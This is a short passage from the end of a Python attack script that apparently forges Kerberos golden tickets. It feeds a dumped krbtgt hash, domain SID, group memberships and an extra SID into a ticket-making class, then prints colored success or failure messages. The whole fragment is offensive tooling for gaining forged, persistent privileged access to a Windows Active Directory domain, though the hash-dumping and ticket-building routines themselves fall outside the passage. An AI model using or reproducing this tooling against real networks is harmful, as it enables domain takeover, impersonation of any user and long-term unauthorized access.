        print(Fore.YELLOW + "[*] - Using AES with Key Derivation for checksums" + Style.RESET_ALL)
    else:
        print(Fore.YELLOW + "[*] - Using RC4 with direct key" + Style.RESET_ALL)
    
    maker = ModernGoldenTicketMaker()
    output = maker.create_golden_ticket(
        domain=domain,
        krbtgt_hash=dumper.krbtgt_hash,
        domain_sid=domain_sid,
        target_user=ticket_user,
        output_path=ticket_path,
        user_id=user_id,
        groups=groups,
        extra_sid=extra_sid,
        aes_key=aes_key
    )
    
    if output:
        print(Fore.GREEN + f"\n[+] SUCCESS! Ticket created: {output}" + Style.RESET_ALL)
       
    else:
        print(Fore.RED + "[-] Failed to create ticket!" + Style.RESET_ALL)


if __name__ == '__main__':
    main()
